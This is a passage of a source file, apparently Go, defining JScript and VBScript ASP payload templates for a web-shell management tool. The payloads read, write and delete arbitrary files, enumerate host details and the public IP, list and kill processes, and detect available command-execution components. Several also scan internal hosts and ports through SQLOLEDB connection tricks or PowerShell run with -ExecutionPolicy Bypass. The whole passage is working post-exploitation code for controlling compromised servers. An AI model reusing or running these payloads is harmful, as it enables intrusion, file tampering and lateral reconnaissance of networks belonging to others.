  stream.Type = 1; stream.Open(); stream.LoadFromFile(__PATH__);
  var bin = stream.Read(); stream.Close();
  var xml = new ActiveXObject("MSXML2.DOMDocument");
  var node = xml.createElement("b64"); node.dataType = "bin.base64"; node.nodeTypedValue = bin;
  Response.Write(JSON.stringify({ ok: true, name: name, size: size, base64: node.text }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspFsWrite = `try {
  var xml = new ActiveXObject("MSXML2.DOMDocument");
  var node = xml.createElement("b64"); node.dataType = "bin.base64"; node.text = __B64__;
  var bin = node.nodeTypedValue;
  var stream = new ActiveXObject("ADODB.Stream");
  stream.Type = 1; stream.Open(); stream.Write(bin); stream.SaveToFile(__PATH__, 2); stream.Close();
  Response.Write(JSON.stringify({ ok: true, bytes: bin.length }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspFsDelete = `try {
  var fs = new ActiveXObject("Scripting.FileSystemObject");
  if (fs.FileExists(__PATH__)) { fs.DeleteFile(__PATH__); }
  else if (fs.FolderExists(__PATH__)) { fs.DeleteFolder(__PATH__); }
  Response.Write(JSON.stringify({ ok: true }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspMonitor = `function wmiDate(s) {
  if (!s) return null;
  var y = +s.substr(0, 4), mo = +s.substr(4, 2), d = +s.substr(6, 2),
      h = +s.substr(8, 2), mi = +s.substr(10, 2), se = +s.substr(12, 2);
  return new Date(y, mo - 1, d, h, mi, se);
}
try {
  var wmi = GetObject("winmgmts:\\.\root\cimv2");
  var host = "", oscap = "", upsec = null;
  var cs = wmi.ExecQuery("SELECT Name FROM Win32_ComputerSystem");
  for (var e = new Enumerator(cs); !e.atEnd(); e.moveNext()) { host = e.item().Name; }
  var os = wmi.ExecQuery("SELECT Caption,TotalVisibleMemorySize,FreePhysicalMemory,LastBootUpTime FROM Win32_OperatingSystem");
  var mem = { MemTotal: 0, MemAvailable: 0 };
  for (var e = new Enumerator(os); !e.atEnd(); e.moveNext()) {
    var o = e.item(); oscap = o.Caption;
    mem.MemTotal = (parseInt(o.TotalVisibleMemorySize, 10) || 0) * 1024;
    mem.MemAvailable = (parseInt(o.FreePhysicalMemory, 10) || 0) * 1024;
    upsec = Math.floor((new Date() - wmiDate(o.LastBootUpTime)) / 1000);
  }
  var cores = 0, model = "";
  var cpus = wmi.ExecQuery("SELECT Name,NumberOfLogicalProcessors,NumberOfCores FROM Win32_Processor");
  for (var e = new Enumerator(cpus); !e.atEnd(); e.moveNext()) {
    var c = e.item();
    cores += (parseInt(c.NumberOfLogicalProcessors, 10) || parseInt(c.NumberOfCores, 10) || 1);
    if (!model) model = c.Name;
  }
  var pu = 0;
  try {
    var q = wmi.ExecQuery("SELECT PercentProcessorTime FROM Win32_PerfFormattedData_PerfOS_Processor WHERE Name='_Total'");
    for (var e = new Enumerator(q); !e.atEnd(); e.moveNext()) { pu = e.item().PercentProcessorTime; }
  } catch (e2) {}
  var disks = [];
  var dq = wmi.ExecQuery("SELECT DeviceID,Size,FreeSpace,FileSystem FROM Win32_LogicalDisk WHERE DriveType=3");
  for (var e = new Enumerator(dq); !e.atEnd(); e.moveNext()) {
    var d = e.item();
    var total = parseInt(d.Size, 10) || 0, free = parseInt(d.FreeSpace, 10) || 0;
    disks.push({ fs: d.FileSystem || "", total: total, used: total - free, avail: free,
      use: total > 0 ? Math.round((total - free) / total * 100) : 0, mount: d.DeviceID + "\\" });
  }
  var intIPs = [];
  try {
    var nc = wmi.ExecQuery("SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE");
    for (var e2 = new Enumerator(nc); !e2.atEnd(); e2.moveNext()) {
      var cfg = e2.item();
      if (cfg.IPAddress) {
        var ips = new VBArray(cfg.IPAddress).toArray();
        for (var k = 0; k < ips.length; k++) {
          var a = ips[k];
          if (a && a.indexOf(":") < 0 && a.indexOf("127.") !== 0 && a.indexOf("169.254.") !== 0) intIPs.push(a);
        }
      }
    }
  } catch (e3) {}
  var pubIP = "";
  try {
    var xh = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    xh.SetTimeouts(5000, 5000, 5000, 5000);
    xh.Open("GET", "https://cip.cc", false);
    xh.Send();
    var txt = (xh.ResponseText || "").trim();
    var m = /^IP\s*:\s*([0-9a-fA-F\.:]+)/.exec(txt);
    if (m && m[1].length <= 45) { pubIP = m[1]; }
    else if (/^[0-9a-fA-F\.:]+$/.test(txt) && txt.length <= 45) { pubIP = txt; }
    if (pubIP === "") {
      try {
        var xh2 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        xh2.SetTimeouts(5000, 5000, 5000, 5000);
        xh2.Open("GET", "https://icanhazip.com", false);
        xh2.Send();
        pubIP = (xh2.ResponseText || "").trim();
      } catch (e5) {}
    }
    if (pubIP === "") {
      try {
        var xh3 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        xh3.SetTimeouts(5000, 5000, 5000, 5000);
        xh3.Open("GET", "https://ipconfig.io", false);
        xh3.Send();
        pubIP = (xh3.ResponseText || "").trim();
      } catch (e6) {}
    }
  } catch (e4) {}
  Response.Write(JSON.stringify({ ok: true, hostname: host, os: oscap,
    uptime: (upsec == null ? "" : upsec), loadavg: [],
    cpu: { cores: cores, model: model, usage: pu / 100 }, mem: mem, disks: disks,
    intIPs: intIPs, pubIP: pubIP }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspProc = `try {
  var wmi = GetObject("winmgmts:\\.\root\cimv2");
  var totalBytes = 0;
  var os = wmi.ExecQuery("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
  for (var e = new Enumerator(os); !e.atEnd(); e.moveNext()) {
    totalBytes = (parseInt(e.item().TotalVisibleMemorySize, 10) || 0) * 1024;
  }
  var procs = [];
  var q = wmi.ExecQuery("SELECT ProcessId,ParentProcessId,Name,CommandLine,WorkingSetSize FROM Win32_Process");
  for (var e = new Enumerator(q); !e.atEnd(); e.moveNext()) {
    var p = e.item();
    var owner = "";
    try { var dom = "", user = ""; if (p.GetOwner(user, dom) === 0) { owner = (dom ? dom + "\\" : "") + user; } } catch (e2) {}
    var ws = parseInt(p.WorkingSetSize, 10) || 0;
    var memPct = totalBytes > 0 ? (ws / totalBytes * 100) : 0;
    procs.push({ pid: p.ProcessId, ppid: p.ParentProcessId, user: owner, cpu: 0,
      mem: Math.round(memPct * 10) / 10, cmd: (p.CommandLine || p.Name || "") });
  }
  Response.Write(JSON.stringify({ ok: true, procs: procs }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspProcKill = `try {
  var force = (__SIG__ === 9);
  var ws = new ActiveXObject("WScript.Shell");
  var cmd = "taskkill /PID " + __PID__ + (force ? " /F" : "");
  var ec = ws.Exec("cmd /c " + cmd + " 2>&1");
  var out = "";
  while (!ec.StdOut.AtEndOfStream) { out += ec.StdOut.ReadLine() + "\n"; }
  while (!ec.StdErr.AtEndOfStream) { out += ec.StdErr.ReadLine() + "\n"; }
  var ok = /SUCCESS/i.test(out);
  Response.Write(JSON.stringify({ ok: ok, error: ok ? "" : out.trim() }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspPorts = `try {
  var ws = new ActiveXObject("WScript.Shell");
  var ec = ws.Exec("cmd /c netstat -ano 2>&1");
  var out = "";
  while (!ec.StdOut.AtEndOfStream) { out += ec.StdOut.ReadLine() + "\n"; }
  while (!ec.StdErr.AtEndOfStream) { out += ec.StdErr.ReadLine() + "\n"; }
  var lines = out.split("\n"), ports = [];
  for (var i = 0; i < lines.length; i++) {
    var ln = lines[i].replace(/\s+/g, " ").trim();
    if (!ln) continue;
    var parts = ln.split(" ");
    if (parts.length < 5) continue;
    if (parts[0].toUpperCase() !== "TCP") continue;
    if (parts[3] !== "LISTENING") continue;
    var local = parts[1], pid = parts[4];
    var idx = local.lastIndexOf(":");
    var addr = local.substring(0, idx).replace(/^\\[/, "").replace(/\\]$/, "");
    var port = parseInt(local.substring(idx + 1), 10);
    ports.push({ proto: "tcp", addr: addr, port: port, inode: "", pid: pid, comm: "" });
  }
  Response.Write(JSON.stringify({ ok: true, ports: ports }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspPortScan = `var host = __HOST__;
var st = Date.now();
var adoAvail = true;
try { var _t = new ActiveXObject("ADODB.Connection"); }
catch (e) { adoAvail = false; }
if (adoAvail) {
  var plist = "__PORTS__".split(",");
  var results = [];
  for (var i = 0; i < plist.length; i++) {
    var port = (plist[i] + "").replace(/^\s+|\s+$/g, "");
    if (!port) continue;
    var open = false;
    try {
      var c = new ActiveXObject("ADODB.Connection");
      c.ConnectionTimeout = 2;
      c.CommandTimeout = 2;
      c.Open("Provider=SQLOLEDB;Data Source=" + host + "," + port + ";User ID=sa;Password=sa;Connect Timeout=2;");
      open = true;
    } catch (e) {
      var d = (((e && e.description) ? e.description : "") + " " + ((e && e.message) ? e.message : "")) + "";
      d = d.toLowerCase();
      if (d.indexOf("does not exist") >= 0 || d.indexOf("refused") >= 0 || d.indexOf("network-related") >= 0 || d.indexOf("timed out") >= 0 || d.indexOf("timeout expired") >= 0 || d.indexOf("could not open a connection") >= 0) open = false;
      else open = true;
    }
    results.push({ port: parseInt(port, 10), open: open });
  }
  Response.Write(JSON.stringify({ ok: true, host: host, ports: results, elapsed: (Date.now() - st) / 1000 }));
} else {
  var sh = null, shAvail = true, shErr = "";
  try { sh = new ActiveXObject("WScript.Shell"); }
  catch (e) { shAvail = false; shErr = (e ? e.message : ""); }
  if (!shAvail) {
    Response.Write(JSON.stringify({ ok: false, error: "WScript.Shell/ADO 均不可用: " + shErr }));
  } else {
    var ports = "__PORTS__";
    var ps = "$h='" + host + "';$ps='" + ports + "'.Split(',');$r=@();foreach($p in $ps){$p=$p.Trim();if($p-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$p,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(1500);$open=$false;try{if($ok){$t.EndConnect($ar);$open=$true}}catch{$open=$false}finally{try{$t.Close()}catch{}}$r+=@{port=[int]$p;open=$open}}};@{ok=$true;host=$h;ports=$r;elapsed=0}|ConvertTo-Json -Compress -Depth 4";
    var ec = sh.Exec("powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WarningAction SilentlyContinue -Command \"" + ps + "\"");
    var out = "";
    while (!ec.StdOut.AtEndOfStream) { out += ec.StdOut.ReadLine() + "\n"; }
    out = (out + "").replace(/^\s+|\s+$/g, "");
    if (out.charAt(0) === "{") {
      Response.Write(out.replace(/"elapsed":0/, '"elapsed":' + ((Date.now() - st) / 1000).toFixed(2)));
    } else {
      var results2 = [];
      var plist2 = "__PORTS__".split(",");
      for (var i = 0; i < plist2.length; i++) {
        var port = (plist2[i] + "").replace(/^\s+|\s+$/g, "");
        if (!port) continue;
        var open = false, code = 0;
        try {
          var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
          h.SetTimeouts(2000, 2000, 2000, 2000);
          h.Open("GET", "http://" + host + ":" + port + "/", false);
          h.Send();
          open = true;
        } catch (e) {
          code = (e && typeof e.number !== "undefined") ? e.number : 0;
          if (code === -2147012867 || code === -2147012894 || code === -2147012889) open = false;
          else open = true;
        }
        results2.push({ port: parseInt(port, 10), open: open });
      }
      Response.Write(JSON.stringify({ ok: true, host: host, ports: results2, elapsed: (Date.now() - st) / 1000 }));
    }
  }
}`

const vbsHostScan = `On Error Resume Next
Dim hosts, ports, probe, arrH, arrP, arrPr, hi, pi, h, pr, port, allResults, hres, opj, up, st, hasAdo, c, d, adoRes, ws, ec, out, ps, usePs, http2, code2, ok2, up2, opj2, hres2, harr, parr, prr, hi2, pi2, h2, pr2, port2, adoUsable, calDesc
hosts = __HOSTS__
ports = __PORTS__
probe = __PROBE__
st = Timer
hasAdo = False
adoUsable = False
Set c = CreateObject("ADODB.Connection")
If Err.Number = 0 Then hasAdo = True
Err.Clear
' 校准：连必然关闭的 127.0.0.1:1，确认 SQLOLEDB provider 真实可用。
' provider 缺失时 c.Open 的错误与主机/端口状态无关，会把所有主机误判存活、所有端口误判开放
If hasAdo Then
  Set c = CreateObject("ADODB.Connection")
  c.ConnectionTimeout = 1
  c.CommandTimeout = 1
  Err.Clear
  c.Open "Provider=SQLOLEDB;Data Source=127.0.0.1,1;User ID=sa;Password=sa;Connect Timeout=1;"
  calDesc = LCase(CStr(Err.Description))
  If Err.Number <> 0 Then
    If InStr(calDesc, "provider") = 0 And InStr(calDesc, "not registered") = 0 And InStr(calDesc, "cannot be found") = 0 Then
      adoUsable = True
    End If
  End If
  c.Close
  Err.Clear
End If
arrH = Split(hosts, "|")
arrP = Split(ports, ",")
arrPr = Split(probe, ",")
allResults = ""
If adoUsable Then
  For hi = 0 To UBound(arrH)
    h = Trim(arrH(hi))
    If h <> "" Then
      up = False
      For pi = 0 To UBound(arrPr)
        pr = Trim(arrPr(pi))
        If pr <> "" Then
          adoRes = False
          Set c = CreateObject("ADODB.Connection")
          c.ConnectionTimeout = 1
          c.CommandTimeout = 1
          c.Open "Provider=SQLOLEDB;Data Source=" & h & "," & pr & ";User ID=sa;Password=sa;Connect Timeout=1;"
          If Err.Number = 0 Then
            adoRes = True
          Else
            d = LCase(CStr(Err.Description))
            If InStr(d, "does not exist") > 0 Or InStr(d, "refused") > 0 Or InStr(d, "network-related") > 0 Or InStr(d, "timed out") > 0 Or InStr(d, "timeout expired") > 0 Or InStr(d, "could not open a connection") > 0 Then
              adoRes = False
            Else
              adoRes = True
            End If
          End If
          c.Close
          Err.Clear
          If adoRes Then up = True
        End If
        If up Then Exit For
        ' 预算保护：ADO 对不可达/被过滤主机可能阻塞远超 Connect Timeout
        If Timer - st > 20 Then Exit For
      Next
      opj = ""
      If up Then
        For pi = 0 To UBound(arrP)
          port = Trim(arrP(pi))
          If port <> "" Then
            adoRes = False
            Set c = CreateObject("ADODB.Connection")
            c.ConnectionTimeout = 1
            c.CommandTimeout = 1
            c.Open "Provider=SQLOLEDB;Data Source=" & h & "," & port & ";User ID=sa;Password=sa;Connect Timeout=1;"
            If Err.Number = 0 Then
              adoRes = True
            Else
              d = LCase(CStr(Err.Description))
              If InStr(d, "does not exist") > 0 Or InStr(d, "refused") > 0 Or InStr(d, "network-related") > 0 Or InStr(d, "timed out") > 0 Or InStr(d, "timeout expired") > 0 Or InStr(d, "could not open a connection") > 0 Then
                adoRes = False
              Else
                adoRes = True
              End If
            End If
            c.Close
            Err.Clear
            If adoRes Then opj = opj & "," & port
          End If
          If Timer - st > 25 Then Exit For
        Next
      End If
      If Len(opj) > 0 Then opj = Mid(opj, 2)
      If up Then
        hres = "{""host"":""" & h & """,""alive"":true,""ports"":[" & opj & "]}"
      Else
        hres = "{""host"":""" & h & """,""alive"":false,""ports"":[]}"
      End If
      allResults = allResults & "," & hres
    End If
    ' 总预算：超预算停止后续主机并返回已有结果，避免 Go 侧 context 超时
    If Timer - st > 25 Then Exit For
  Next
  If Len(allResults) > 0 Then allResults = Mid(allResults, 2)
  Response.Write("{""ok"":true,""hosts"":[" & allResults & "],""elapsed"":" & CStr(Timer - st) & "}")
Else
  usePs = False
  Set ws = CreateObject("WScript.Shell")
  If Err.Number = 0 Then
  ps = "$hs='" & hosts & "'.Split('|');$ps='" & ports & "'.Split(',');$pr='" & probe & "'.Split(',');$res=@();foreach($h in $hs){$h=$h.Trim();if($h-ne''){$up=$false;foreach($q in $pr){$q=$q.Trim();if($q-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$q,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(600);$o=$false;try{if($ok){$t.EndConnect($ar);$o=$true}}catch{$o=$false}finally{try{$t.Close()}catch{}};if($o){$up=$true;break}}};$op=@();if($up){foreach($p in $ps){$p=$p.Trim();if($p-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$p,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(1000);$o=$false;try{if($ok){$t.EndConnect($ar);$o=$true}}catch{$o=$false}finally{try{$t.Close()}catch{}};if($o){$op+=[int]$p}}}}$res+=@{host=$h;alive=$up;ports=$op}};@{ok=$true;hosts=$res;elapsed=0}|ConvertTo-Json -Compress -Depth 4"
  Err.Clear
  Set ec = ws.Exec("powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WarningAction SilentlyContinue -Command """ & ps & """")
  out = ""
  Do While Not ec.StdOut.AtEndOfStream: out = out & ec.StdOut.ReadLine() & vbCrLf: Loop
  If Left(Trim(out), 1) = "{" Then
    usePs = True
    Response.Write(Replace(Trim(out), """elapsed"":0", """elapsed"":" & CStr(Timer - st)))
  End If
End If
If Not usePs Then
  ' 退化：无 PowerShell 时用 WinHttp 探测
  Dim http, code, ok
  harr = Split(hosts, "|")
  parr = Split(ports, ",")
  prr = Split(probe, ",")
  allResults = ""
  st = Timer
  For hi = 0 To UBound(harr)
    h = Trim(harr(hi))
    If h <> "" Then
      up = False
      For pi = 0 To UBound(prr)
        pr = Trim(prr(pi))
        If pr <> "" Then
          Err.Clear
          Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
          If Err.Number = 0 Then
            On Error Resume Next
            http.SetTimeouts 600, 500, 500, 500
            http.Open "GET", "http://" & h & ":" & pr & "/", False
            http.Send
            code = Err.Number
            On Error Resume Next
            If code = 0 Then
              up = True
            ElseIf code = -2147012867 Or code = -2147012894 Or code = -2147012889 Then up = False
            Else up = True
            End If
          End If
          If up Then Exit For
        End If
      Next
      opj = ""
      If up Then
        For pi = 0 To UBound(parr)
          port = Trim(parr(pi))
          If port <> "" Then
            ok = False
            Err.Clear
            Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
            If Err.Number = 0 Then
              On Error Resume Next
              http.SetTimeouts 1000, 800, 800, 800
              http.Open "GET", "http://" & h & ":" & port & "/", False
              http.Send
              code = Err.Number
              On Error Resume Next
              If code = 0 Then
                ok = True
              ElseIf code = -2147012867 Or code = -2147012894 Or code = -2147012889 Then ok = False
              Else ok = True
              End If
            End If
            If ok Then opj = opj & "," & port
          End If
        Next
      End If
      If Len(opj) > 0 Then opj = Mid(opj, 2)
      If up Then
        hres = "{""host"":" & """" & h & """" & ",""alive"":true,""ports"":[" & opj & "]}"
      Else
        hres = "{""host"":" & """" & h & """" & ",""alive"":false,""ports"":[]}"
      End If
      allResults = allResults & "," & hres
    End If
  Next
  If Len(allResults) > 0 Then allResults = Mid(allResults, 2)
  Response.Write("{""ok"":true,""hosts"":[" & allResults & "],""elapsed"":" & CStr(Timer - st) & "}")
End If
End If`

const aspHostScan = `var sh = null, shAvail = true, shErr = "";
try { sh = new ActiveXObject("WScript.Shell"); }
catch (e) { shAvail = false; shErr = (e ? e.message : ""); }
if (!shAvail) {
  Response.Write(JSON.stringify({ ok: false, error: "WScript.Shell 不可用: " + shErr }));
} else {
  var hosts = "__HOSTS__";
  var ports = "__PORTS__";
  var probe = "__PROBE__";
  var st = Date.now();
  var adoAvail = true;
  try { var _c = new ActiveXObject("ADODB.Connection"); }
  catch (e) { adoAvail = false; }
  if (adoAvail) {
    function adoOpen(host, port) {
      try {
        var c = new ActiveXObject("ADODB.Connection");
        c.ConnectionTimeout = 1;
        c.CommandTimeout = 1;
        c.Open("Provider=SQLOLEDB;Data Source=" + host + "," + port + ";User ID=sa;Password=sa;Connect Timeout=1;");
        return true;
      } catch (e) {
        var d = (((e && e.description) ? e.description : "") + " " + ((e && e.message) ? e.message : "")) + "";
        d = d.toLowerCase();
        if (d.indexOf("does not exist") >= 0 || d.indexOf("refused") >= 0 || d.indexOf("network-related") >= 0 || d.indexOf("timed out") >= 0 || d.indexOf("timeout expired") >= 0 || d.indexOf("could not open a connection") >= 0) return false;
        return true;
      }
    }
    var hlist = hosts.split("|");
    var plist = ports.split(",");
    var prlist = probe.split(",");
    var results = [];
    for (var hi = 0; hi < hlist.length; hi++) {
      var h = (hlist[hi] + "").replace(/^\s+|\s+$/g, "");
      if (!h) continue;
      var up = false;
      for (var pi = 0; pi < prlist.length; pi++) {
        var pr = (prlist[pi] + "").replace(/^\s+|\s+$/g, "");
        if (!pr) continue;
        if (adoOpen(h, pr)) { up = true; break; }
      }
      var opj = [];
      if (up) {
        for (var i = 0; i < plist.length; i++) {
          var port = (plist[i] + "").replace(/^\s+|\s+$/g, "");
          if (!port) continue;
          if (adoOpen(h, port)) opj.push(parseInt(port, 10));
        }
      }
      results.push({ host: h, alive: up, ports: opj });
    }
    Response.Write(JSON.stringify({ ok: true, hosts: results, elapsed: (Date.now() - st) / 1000 }));
  } else {
  var ps = "$hs='" + hosts + "'.Split('|');$ps='" + ports + "'.Split(',');$pr='" + probe + "'.Split(',');$res=@();foreach($h in $hs){$h=$h.Trim();if($h-ne''){$up=$false;foreach($q in $pr){$q=$q.Trim();if($q-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$q,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(600);$o=$false;try{if($ok){$t.EndConnect($ar);$o=$true}}catch{$o=$false}finally{try{$t.Close()}catch{}};if($o){$up=$true;break}}}$op=@();if($up){foreach($p in $ps){$p=$p.Trim();if($p-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$p,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(1000);$o=$false;try{if($ok){$t.EndConnect($ar);$o=$true}}catch{$o=$false}finally{try{$t.Close()}catch{}};if($o){$op+=[int]$p}}}}$res+=@{host=$h;alive=$up;ports=$op}};@{ok=$true;hosts=$res;elapsed=0}|ConvertTo-Json -Compress -Depth 4";
  var ec = sh.Exec("powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WarningAction SilentlyContinue -Command \"" + ps + "\"");
  var out = "";
  while (!ec.StdOut.AtEndOfStream) { out += ec.StdOut.ReadLine() + "\n"; }
  out = (out + "").replace(/^\s+|\s+$/g, "");
  if (out.charAt(0) === "{") {
    Response.Write(out.replace(/"elapsed":0/, '"elapsed":' + ((Date.now() - st) / 1000).toFixed(2)));
  } else {
    function tryOpen(host, port, rt, ct) {
      try {
        var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        h.SetTimeouts(rt, ct, ct, ct);
        h.Open("GET", "http://" + host + ":" + port + "/", false);
        h.Send();
        return true;
      } catch (e) {
        var code = (e && typeof e.number !== "undefined") ? e.number : 0;
        if (code === -2147012867 || code === -2147012894 || code === -2147012889) return false;
        return true;
      }
    }
    var hlist = "__HOSTS__".split("|");
    var plist = "__PORTS__".split(",");
    var prlist = "__PROBE__".split(",");
    var results = [], st = Date.now();
    for (var hi = 0; hi < hlist.length; hi++) {
      var h = (hlist[hi] + "").replace(/^\s+|\s+$/g, "");
      if (!h) continue;
      var up = false;
      for (var pi = 0; pi < prlist.length; pi++) {
        var pr = (prlist[pi] + "").replace(/^\s+|\s+$/g, "");
        if (!pr) continue;
        if (tryOpen(h, pr, 600, 500)) { up = true; break; }
      }
      var opj = [];
      if (up) {
        for (var i = 0; i < plist.length; i++) {
          var port = (plist[i] + "").replace(/^\s+|\s+$/g, "");
          if (!port) continue;
          if (tryOpen(h, port, 1000, 800)) opj.push(parseInt(port, 10));
        }
      }
      results.push({ host: h, alive: up, ports: opj });
    }
    Response.Write(JSON.stringify({ ok: true, hosts: results, elapsed: (Date.now() - st) / 1000 }));
  }
}
}`

const aspEnv = `try {
  var ver = "";
  try { ver = ScriptEngineMajorVersion() + "." + ScriptEngineMinorVersion() + " (" + ScriptEngine() + ")"; } catch (e) {}
  var server = "", docRoot = "";
  try { server = (Request.ServerVariables("SERVER_SOFTWARE") + ""); } catch (e) {}
  try { docRoot = (Request.ServerVariables("APPL_PHYSICAL_PATH") + ""); } catch (e) {}
  var osname = "";
  try {
    var wmi = GetObject("winmgmts:\\.\root\cimv2");
    var os = wmi.ExecQuery("SELECT Caption FROM Win32_OperatingSystem");
    for (var e = new Enumerator(os); !e.atEnd(); e.moveNext()) { osname = e.item().Caption; }
  } catch (e) {}
  function avail(progId) { try { var o = new ActiveXObject(progId); return true; } catch (e) { return false; } }
  var comps = {
    "WScript.Shell": avail("WScript.Shell"),
    "Scripting.FileSystemObject": avail("Scripting.FileSystemObject"),
    "ADODB.Stream": avail("ADODB.Stream"),
    "ADODB.Connection": avail("ADODB.Connection"),
    "Scripting.Dictionary": avail("Scripting.Dictionary"),
    "MSXML2.DOMDocument": avail("MSXML2.DOMDocument"),
    "WScript.Network": avail("WScript.Network")
  };
  var anyExec = !!comps["WScript.Shell"];
  var list = [];
  for (var k in comps) { if (comps[k]) list.push(k); }
  Response.Write(JSON.stringify({ kind: "asp", ok: true, engine: ver, serverSoftware: server,
    docRoot: docRoot, os: osname, anyExec: anyExec, execComponents: comps, components: list }));
} catch (e) { Response.Write(JSON.stringify({ kind: "asp", ok: false, error: (e ? e.message : "") })); }`
